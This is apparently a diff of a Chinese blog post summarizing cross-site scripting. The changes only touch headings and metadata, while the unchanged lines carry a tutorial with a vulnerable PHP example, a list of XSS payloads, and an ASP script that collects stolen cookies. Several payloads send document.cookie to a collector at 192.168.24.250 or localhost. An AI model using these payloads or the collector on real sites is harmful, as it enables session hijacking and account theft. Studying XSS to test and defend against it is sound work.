@@ -81,20 +81,20 @@
 
 
 
-<meta name="description" content="xss攻击原理：​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。">
+<meta name="description" content="xss攻击原理​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。">
 <meta name="keywords" content="xss">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS漏洞总结及实战">
 <meta property="og:url" content="http://goudanjun.vip/2021/01/10/XSS漏洞总结及实战.html/index.html">
 <meta property="og:site_name" content="Goudan&#39;s blog">
-<meta property="og:description" content="xss攻击原理：​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。">
+<meta property="og:description" content="xss攻击原理​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://i.loli.net/2021/01/10/gacRS42PWVYAsIG.jpg">
 <meta property="og:image" content="https://i.loli.net/2021/01/10/BJfAohunNzHQjXx.png">
-<meta property="og:updated_time" content="2021-01-10T14:39:38.660Z">
+<meta property="og:updated_time" content="2021-01-10T14:44:14.022Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS漏洞总结及实战">
-<meta name="twitter:description" content="xss攻击原理：​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。">
+<meta name="twitter:description" content="xss攻击原理​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。">
 <meta name="twitter:image" content="https://i.loli.net/2021/01/10/gacRS42PWVYAsIG.jpg">
 
 
@@ -356,11 +356,11 @@
       
 
       
-        <h2 id="xss攻击原理："><a href="#xss攻击原理：" class="headerlink" title="xss攻击原理："></a><strong>xss攻击原理：</strong></h2><p>​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。</p>
+        <h2 id="xss攻击原理"><a href="#xss攻击原理" class="headerlink" title="xss攻击原理"></a><strong>xss攻击原理</strong></h2><p>​    xxs全称（CrossSite Scripting）跨站脚本攻击，是常见的Web应用程序安全漏洞之一，xss指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的各种目的。</p>
 <a id="more"></a>
 
 <p>​    xss攻击的最终目的是在网页中嵌入客户端恶意脚本代码，最常用的攻击代码是JavaScript语言，但也会使用其他互联网客户端脚本代码，例如：ActionScript，VBscript。而如今的互联网客户端脚本代码基本是基于JavaScript，所以要想深入研究xss，必须精通JavaScript。JavaScript可以用来获取用户的Cooike，改变网页的内容，弹出窗口那么存在xss漏洞的网站，xss就可以用来盗取Cooike，黑掉页面，导航到恶意网站！甚至可以完全监控你的键盘操作，模仿windows注销界面，诱导你输入开机密码！而攻击者需要做的仅仅是向你的代码中注入JavaScript代码！</p>
-<h3 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a><strong>XSS的危害</strong></h3><ol>
+<h2 id="xss的危害"><a href="#xss的危害" class="headerlink" title="xss的危害"></a><strong>xss的危害</strong></h2><ol>
 <li>网络钓鱼，包括盗取各类用户账号</li>
 <li>窃取用户Cooikes，利用管理员身份进一步对网站执行操作：</li>
 <li>劫持会话，从而执行任意的操作，例如非法转账，强制发表日志，发送电子邮件：</li>
@@ -370,7 +370,7 @@
 <li>传播跨站脚本蠕虫</li>
 <li>结合其他漏洞，如CSRF漏洞</li>
 </ol>
-<h3 id="xss攻击分类："><a href="#xss攻击分类：" class="headerlink" title="xss攻击分类："></a><strong>xss攻击分类：</strong></h3><p>主要分为三大类：反射型，DOM型，储存型</p>
+<h2 id="xss攻击分类"><a href="#xss攻击分类" class="headerlink" title="xss攻击分类"></a><strong>xss攻击分类</strong></h2><p>主要分为三大类：反射型，DOM型，储存型</p>
 <p><strong>反射型</strong>：（服务器端 ）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username=$_GET[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> $username;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br><span class="line"></span><br><span class="line"><span class="comment">#在这段代码中程序接受username值，并且输出，如果提交xss.php? username=zhangsan,那么程序并没有进行xss代码过滤，最终造成了反射型xss漏洞</span></span><br></pre></td></tr></table></figure>
 
@@ -381,7 +381,7 @@
 <p>与反射型相比，唯一的区别就是xss代码被存入了数据库中，在下次浏览时，又被读取出来</p>
 <p>相对反射型，一般来说储存型的危害更大</p>
 <p>真实案例：wooyun-2014-83651 凤凰网储存xss</p>
-<h3 id="xss测试技巧："><a href="#xss测试技巧：" class="headerlink" title="xss测试技巧："></a><strong>xss测试技巧：</strong></h3><p><strong>工具检查</strong>: APPSCAN,AWVS,BurpSuit等综合型的扫描工具，但不如专门的xss检测工具（XSSER、XSSF、NoXss）效率高，不能检测储存型的xss漏洞</p>
+<h2 id="xss测试技巧"><a href="#xss测试技巧" class="headerlink" title="xss测试技巧"></a><strong>xss测试技巧</strong></h2><p><strong>工具检查</strong>: APPSCAN,AWVS,BurpSuit等综合型的扫描工具，但不如专门的xss检测工具（XSSER、XSSF、NoXss）效率高，不能检测储存型的xss漏洞</p>
 <p><strong>手工测试</strong>：</p>
 <p>常用的xss攻击脚本：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert("xss test!")<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>document.write(document.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>document.location='http://localhost/xss_savecookie.asp?xcookie='+document.cookie<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>'<span class="attr">test</span>')&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.write(document.cookie)</span>&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.location</span>=<span class="string">'http://192.168.24.250:83/xss_savecookie.asp?xcookie='</span>+<span class="attr">document.cookie</span>&gt;</span>点击察看详情<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">http://localhost/xss_savecookie.asp?xcookie=ASPSESSIONIDAARDBTAQ=HGOPGOPCEKEPHHDEBPHJPGLB;%20gbtoyAtBD=4;%20gbtoyTime=2012%2D6%2D11+23%3A33%3A29;%20gbtoy=pass=123456&amp;user=linhai</span><br><span class="line"></span><br><span class="line">http://192.168.24.250:81/cookiesave/XSS_savecookie.asp    &amp;lt  <span class="tag">&lt;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:document.location</span>=<span class="string">'http://192.168.24.250:81/cookiesave/XSS_savecookie.asp?xcookie='</span>+<span class="attr">document.cookie</span>&gt;</span>adfasdfasdf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -403,7 +403,7 @@
 
 <p>那么程序在读文件名显示在html文档中，也会触发xss跨站漏洞的。</p>
 <p>有输入的地方就可能存在着风险，如果连输入都没有，xss就不必检测了，包括其他安全漏洞</p>
-<h3 id="XSS实战"><a href="#XSS实战" class="headerlink" title="XSS实战"></a>XSS实战</h3><h4 id="0x00-XSS会话劫持"><a href="#0x00-XSS会话劫持" class="headerlink" title="0x00 XSS会话劫持"></a><strong>0x00 XSS会话劫持</strong></h4><p><strong>盗取cookie：</strong></p>
+<h2 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h2><h3 id="0x00-XSS会话劫持"><a href="#0x00-XSS会话劫持" class="headerlink" title="0x00 XSS会话劫持"></a><strong>0x00 XSS会话劫持</strong></h3><p><strong>盗取cookie：</strong></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(doucument.cookie)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2021/01/10/gacRS42PWVYAsIG.jpg" alt="img"></p>
@@ -415,7 +415,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;font size=&quot;4&quot; color=&quot;#FF0000&quot;&gt;&lt;b&gt;自动接收跨站脚本截取到的Cookie信息，保存于cookie_xss.txt文件中。&lt;/b&gt; &lt;/font&gt;</span><br><span class="line">&lt;%</span><br><span class="line">dim XCookie,StrCookieText,strLogFile,XUser</span><br><span class="line">strLogFile=&quot;cookie_xss.txt&quot;</span><br><span class="line">XCookie=request(&quot;xcookie&quot;)</span><br><span class="line">XUser=request(&quot;user&quot;)</span><br><span class="line">if XCookie=&quot;&quot;  then</span><br><span class="line">  response.write &quot;cookie信息为空！&quot;</span><br><span class="line">  response.end</span><br><span class="line">End If</span><br><span class="line">StrCookieText=StrCookieText&amp;&quot;Cookie值为：----&quot;&amp;XCookie&amp;&quot; user=&quot;&amp;XUser&amp;&quot;----&quot;&amp;request.servervariables(&quot;REMOTE_HOST&quot;)</span><br><span class="line">StrCookieText=StrCookieText&amp;&quot; &quot;&amp;date&amp;&quot; &quot;&amp;time</span><br><span class="line"></span><br><span class="line">set f=Server.CreateObject(&quot;scripting.filesystemobject&quot;)</span><br><span class="line">set ff=f.opentextfile(server.mappath(&quot;.&quot;)&amp;&quot;\&quot;&amp;strLogFile,8,true,0)</span><br><span class="line">ff.writeline(chr(13)+chr(10)&amp;StrCookieText)</span><br><span class="line">ff.close</span><br><span class="line">set ff=nothing</span><br><span class="line">set f=nothing</span><br><span class="line">                      </span><br><span class="line">response.write &quot;&lt;br&gt;&lt;br&gt;提示：此脚本仅限测试!&quot;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2021/01/10/BJfAohunNzHQjXx.png" alt="微信截图_20210110113640"></p>
-<h3 id="XSS防御策略"><a href="#XSS防御策略" class="headerlink" title="XSS防御策略"></a>XSS防御策略</h3><h3 id="★注"><a href="#★注" class="headerlink" title="★注"></a>★注</h3><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a><strong>同源策略</strong></h4><p>是一种约定，他是浏览器最核心也是最基本的安全功能，可以说web是建立在同源策略的基础上的，浏览器只是针对同源策略的一种实现</p>
+<h2 id="xss防御策略"><a href="#xss防御策略" class="headerlink" title="xss防御策略"></a>xss防御策略</h2><h2 id="★注"><a href="#★注" class="headerlink" title="★注"></a>★注</h2><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a><strong>同源策略</strong></h3><p>是一种约定，他是浏览器最核心也是最基本的安全功能，可以说web是建立在同源策略的基础上的，浏览器只是针对同源策略的一种实现</p>
 <p>同源策略的四大要素：</p>
 <p>1，host（域名或IP地址，如果是IP地址则看作一个根域名）</p>
 <p>2，子域名</p>
@@ -426,7 +426,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">,<span class="tag">&lt;<span class="name">img</span>&gt;</span>,<span class="tag">&lt;<span class="name">iframe</span>&gt;</span>,<span class="tag">&lt;<span class="name">link</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 <p>等标签都可以跨域加载资源，而不受同源策略的限制。这些带有”src“属性的标签每次加载的时候，实际上是由浏览器发起的一个get请求。</p>
-<h4 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a><strong>XSS平台</strong></h4><p>BeEF,XSS Proxy，Backframe，国内的XXSER.ME(XSS Platfrom)也是比较优秀的XSS漏洞利用框架</p>
+<h3 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a><strong>XSS平台</strong></h3><p>BeEF,XSS Proxy，Backframe，国内的XXSER.ME(XSS Platfrom)也是比较优秀的XSS漏洞利用框架</p>
 <p>其实框架是一组”javascript“工具集合，比如实现键盘记录，点击劫持等</p>
 
       
@@ -606,7 +606,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#xss攻击原理："><span class="nav-number">1.</span> <span class="nav-text">xss攻击原理：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS的危害"><span class="nav-number">1.1.</span> <span class="nav-text">XSS的危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss攻击分类："><span class="nav-number">1.2.</span> <span class="nav-text">xss攻击分类：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss测试技巧："><span class="nav-number">1.3.</span> <span class="nav-text">xss测试技巧：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS实战"><span class="nav-number">1.4.</span> <span class="nav-text">XSS实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-XSS会话劫持"><span class="nav-number">1.4.1.</span> <span class="nav-text">0x00 XSS会话劫持</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS防御策略"><span class="nav-number">1.5.</span> <span class="nav-text">XSS防御策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#★注"><span class="nav-number">1.6.</span> <span class="nav-text">★注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#同源策略"><span class="nav-number">1.6.1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS平台"><span class="nav-number">1.6.2.</span> <span class="nav-text">XSS平台</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#xss攻击原理"><span class="nav-number">1.</span> <span class="nav-text">xss攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss的危害"><span class="nav-number">2.</span> <span class="nav-text">xss的危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss攻击分类"><span class="nav-number">3.</span> <span class="nav-text">xss攻击分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss测试技巧"><span class="nav-number">4.</span> <span class="nav-text">xss测试技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss实战"><span class="nav-number">5.</span> <span class="nav-text">xss实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-XSS会话劫持"><span class="nav-number">5.1.</span> <span class="nav-text">0x00 XSS会话劫持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss防御策略"><span class="nav-number">6.</span> <span class="nav-text">xss防御策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#★注"><span class="nav-number">7.</span> <span class="nav-text">★注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#同源策略"><span class="nav-number">7.1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS平台"><span class="nav-number">7.2.</span> <span class="nav-text">XSS平台</span></a></li></ol></li></ol></div>
             
 
           </div>
